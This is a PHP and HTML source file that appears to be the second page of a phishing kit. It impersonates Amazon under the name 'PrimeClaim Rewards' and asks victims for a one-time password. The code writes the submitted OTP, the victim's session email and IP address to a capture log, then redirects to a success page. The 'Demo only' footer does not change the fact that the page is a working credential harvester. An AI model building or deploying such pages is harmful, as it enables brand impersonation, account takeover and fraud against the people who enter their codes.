<?php
session_start();

if (!isset($_SESSION['email'])) {
    header("Location: index.php");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $otp = $_POST['otp'] ?? 'N/A';

    $log = date('Y-m-d H:i:s') . " | STEP2 | OTP: $otp | Email: " . $_SESSION['email'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents('logs/capture.log', $log, FILE_APPEND);

    session_destroy();
    header("Location: success.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PrimeClaim Rewards - OTP Verification</title>
    <style> /* copy same style from index.php */ </style>
</head>
<body>
    <div class="container">
        <div class="logo">amazon</div>
        <h1>Enter OTP</h1>
        <p>We've sent a one-time password to your email.</p>

        <form method="POST">
            <input type="text" name="otp" placeholder="Enter 6-digit OTP" required maxlength="6">
            <button type="submit">Verify OTP</button>
        </form>

        <div class="footer">Demo only – no real OTP sent.</div>
    </div>
</body>
</html>